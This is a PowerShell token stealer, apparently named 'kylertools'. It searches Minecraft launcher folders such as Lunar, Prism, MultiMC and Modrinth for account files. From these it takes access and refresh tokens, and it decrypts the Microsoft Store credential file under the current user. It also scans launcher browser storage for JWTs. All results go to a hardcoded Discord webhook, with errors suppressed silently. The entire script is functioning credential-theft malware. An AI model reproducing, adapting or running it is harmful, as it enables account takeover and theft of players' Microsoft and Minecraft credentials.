$webhook = $env:KYLER_WEBHOOK
if(-not $webhook){ $webhook = "https://discord.com/api/webhooks/1558775165108617317/PrGnU2Y-6TKmE8zktMFJXv5b2ZUSOQUl-uWn7BaGmmarXo4v0kTV9JoxAGlLQhsLikit" }
$h = @{ "Content-Type" = "application/json" }

Add-Type -AssemblyName System.Security -EA 0

try{
    $ping = @{ content = "**kylertools** connected" } | ConvertTo-Json
    iwr -Uri $webhook -Method Post -Headers $h -Body $ping -TimeoutSec 8 -EA 0 | Out-Null
}catch{}

$found = @()
$seen = @{}

$jwtRegex = "eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}"

function Add-Token {
    param($tok, $user, $src, $type)
    if(-not $tok){ return }
    if($tok.Length -lt 100){ return }
    if(-not $tok.StartsWith("eyJ")){ return }
    $key = "$type|$tok"
    if($seen.ContainsKey($key)){ return }
    $seen[$key] = $true
    $script:found += "user: $user`ntype: $type`n$type`: $tok`nfile: $src`n"
}

function Scan-Text {
    param($text, $src, $user)
    if(-not $text){ return }
    [regex]::Matches($text, $jwtRegex) | %{ Add-Token $_.Value $user $src "accessToken" }
}

function Scan-File {
    param($path, $user)
    try{
        if((Get-Item $path -EA 0).Length -gt 5mb){ return }
        $raw = Get-Content $path -Raw -EA 0
        if(-not $raw){ return }
        try{
            $j = $raw | ConvertFrom-Json
            # walk every object lookin for token keys
            $stack = New-Object System.Collections.Stack
            $stack.Push($j)
            while($stack.Count -gt 0){
                $node = $stack.Pop()
                if($null -eq $node){ continue }
                if($node -is [System.Collections.IEnumerable] -and $node -isnot [string]){
                    foreach($item in $node){ $stack.Push($item) }
                    continue
                }
                if($node -isnot [PSCustomObject]){ continue }
                $uname = "unknown"
                foreach($k in @("username","name","displayName","profileName")){
                    if($node.PSObject.Properties[$k] -and $node.$k){ $uname = $node.$k; break }
                }
                if($node.minecraftProfile -and $node.minecraftProfile.name){ $uname = $node.minecraftProfile.name }
                foreach($k in @("accessToken","token","access_token")){
                    if($node.PSObject.Properties[$k] -and $node.$k){ Add-Token $node.$k $uname $path "accessToken" }
                }
                foreach($k in @("refreshToken","refresh_token")){
                    if($node.PSObject.Properties[$k] -and $node.$k){ Add-Token $node.$k $uname $path "refreshToken" }
                }
                foreach($prop in $node.PSObject.Properties){
                    if($prop.Value -is [PSCustomObject] -or ($prop.Value -is [System.Collections.IEnumerable] -and $prop.Value -isnot [string])){
                        $stack.Push($prop.Value)
                    }
                }
            }
        }catch{}
        Scan-Text $raw $path $user
    }catch{}
}

# 1. known launcher files
$paths = @(
    "$env:APPDATA\.minecraft\launcher_accounts.json",
    "$env:APPDATA\.minecraft\launcher_accounts_microsoft_store.json",
    "$env:LOCALAPPDATA\.minecraft\launcher_accounts.json",
    "$env:APPDATA\.minecraft\TlauncherProfiles.json",
    "$env:APPDATA\.minecraft\VaultKey\accounts.json",
    "$env:APPDATA\.minecraft\VaultKey\profiles.json",
    "$env:APPDATA\.minecraft\VaultKey\msa.json",
    "$env:APPDATA\.minecraft\VaultKey\auth.json",
    "$env:APPDATA\.lunarclient\settings\game\accounts.json",
    "$env:APPDATA\.lunarclient\accounts.json",
    "$env:APPDATA\.technic\oauth\accounts.json",
    "$env:APPDATA\.feather\accounts.json",
    "$env:APPDATA\PrismLauncher\accounts.json",
    "$env:APPDATA\MultiMC\accounts.json",
    "$env:APPDATA\PollyMC\accounts.json",
    "$env:APPDATA\ModrinthApp\caches\metadata\minecraft_auth.json",
    "$env:APPDATA\ModrinthApp\launcher_accounts.json",
    "$env:APPDATA\ModrinthApp\launcher_profiles.json",
    "$env:APPDATA\xmcl\user.json",
    "$env:LOCALAPPDATA\Packages\XMCL_68mcaawk44tpj\LocalCache\Roaming\xmcl\user.json",
    "$env:APPDATA\.salwyrr\accounts.json",
    "$env:APPDATA\.sklauncher\accounts.json",
    "$env:APPDATA\Badlion Client\accounts.json",
    # new from pdf
    "$env:APPDATA\.minecraft\LabyMod\accounts.json",
    "$env:APPDATA\.gdllauncher-carbon\user-data\user-profiles.json",
    "$env:APPDATA\.ATLauncher\accounts.json",
    "$env:APPDATA\.minecraft\tl_accounts.json"
)

foreach($p in $paths){
    if(Test-Path $p){ Scan-File $p "unknown" }
}

# 2. decrypt msa bin
$bin = "$env:APPDATA\.minecraft\launcher_msa_credentials_microsoft_store.bin"
if(Test-Path $bin){
    try{
        $bytes = [IO.File]::ReadAllBytes($bin)
        $dec = [Security.Cryptography.ProtectedData]::Unprotect($bytes, $null, "CurrentUser")
        $txt = [Text.Encoding]::UTF8.GetString($dec)
        Scan-Text $txt $bin "unknown"
    }catch{}
}

# 3. deep scan launcher roots
$roots = @(
    "$env:APPDATA\.minecraft",
    "$env:APPDATA\.lunarclient",
    "$env:APPDATA\ModrinthApp",
    "$env:APPDATA\PrismLauncher",
    "$env:APPDATA\MultiMC",
    "$env:APPDATA\xmcl",
    "$env:APPDATA\.technic",
    "$env:APPDATA\.feather",
    "$env:APPDATA\.gdllauncher-carbon",
    "$env:APPDATA\.ATLauncher",
    "$env:APPDATA\PollyMC"
)

$includeNames = @("accounts.json","launcher_accounts.json","launcher_accounts_microsoft_store.json","user.json","user-profiles.json","tl_accounts.json","*.auth.json","minecraft_auth.json")

foreach($r in $roots){
    if(-not (Test-Path $r)){ continue }
    try{
        Get-ChildItem $r -Recurse -File -Include $includeNames -EA 0 | %{
            if($_.FullName -match "webcache|node_modules|\.git\\"){ return }
            if($_.Length -gt 1mb){ return }
            # capture path OUTSIDE inner loop (bug fix)
            $fp = $_.FullName
            Scan-File $fp "unknown"
        }
    }catch{}
}

# 4. modpack profiles
$profileRoots = @(
    "$env:APPDATA\ModrinthApp\profiles",
    "$env:APPDATA\PrismLauncher\instances",
    "$env:APPDATA\MultiMC\instances",
    "$env:APPDATA\.minecraft\config",
    "$env:APPDATA\.minecraft\versions"
)

foreach($pr in $profileRoots){
    if(-not (Test-Path $pr)){ continue }
    try{
        Get-ChildItem $pr -Recurse -File -Include "opsec-accounts.json","accounts.json","*.auth.json" -EA 0 | %{
            if($_.Length -gt 1mb){ return }
            $fp = $_.FullName
            Scan-File $fp "unknown"
        }
    }catch{}
}

# 5. chromium localstorage - size filter BEFORE cap
$webcaches = @(
    "$env:APPDATA\.minecraft\webcache2\Default\Local Storage\leveldb",
    "$env:APPDATA\ModrinthApp\webcache\Default\Local Storage\leveldb",
    "$env:APPDATA\PrismLauncher\webcache\Default\Local Storage\leveldb"
)

foreach($lc in $webcaches){
    if(-not (Test-Path $lc)){ continue }
    try{
        $files = Get-ChildItem $lc -File -Include "*.ldb","*.log" -EA 0 |
            Where-Object { $_.Length -lt 5mb } |
            Select-Object -First 50
        foreach($f in $files){
            try{
                $b = [IO.File]::ReadAllBytes($f.FullName)
                $s = [Text.Encoding]::UTF8.GetString($b)
                Scan-Text $s $f.FullName "unknown"
            }catch{}
        }
    }catch{}
}

function Send-Embed {
    param($title, $desc, $color, $footerText)
    $embed = @{
        title = $title
        description = "``````$desc``````"
        color = $color
        timestamp = (Get-Date).ToString("o")
    }
    if($footerText){ $embed.footer = @{ text = $footerText } }
    $body = @{ embeds = @($embed) } | ConvertTo-Json -Depth 10

    for($i = 0; $i -lt 2; $i++){
        try{
            iwr -Uri $webhook -Method Post -Headers $h -Body $body -TimeoutSec 8 -EA Stop | Out-Null
            return
        }catch{
            $wait = 3
            try{
                $ra = $_.Exception.Response.Headers['Retry-After']
                if($ra){ $wait = [double]$ra }
            }catch{}
            Start-Sleep -Seconds ($wait + 1)
        }
    }
}

if($found.Count -eq 0){
    $joined = "nothin found bro"
} else {
    $joined = $found -join "`n"
}

$limit = 1700
$chunks = @()
for($i = 0; $i -lt $joined.Length; $i += $limit){
    $chunks += $joined.Substring($i, [Math]::Min($limit, $joined.Length - $i))
}

$n = 0
foreach($c in $chunks){
    $n++
    Send-Embed -title "mc tokens" -desc $c -color 5793266 -footerText "kylertools | part $n/$($chunks.Count)"
    Start-Sleep -Seconds 2
}
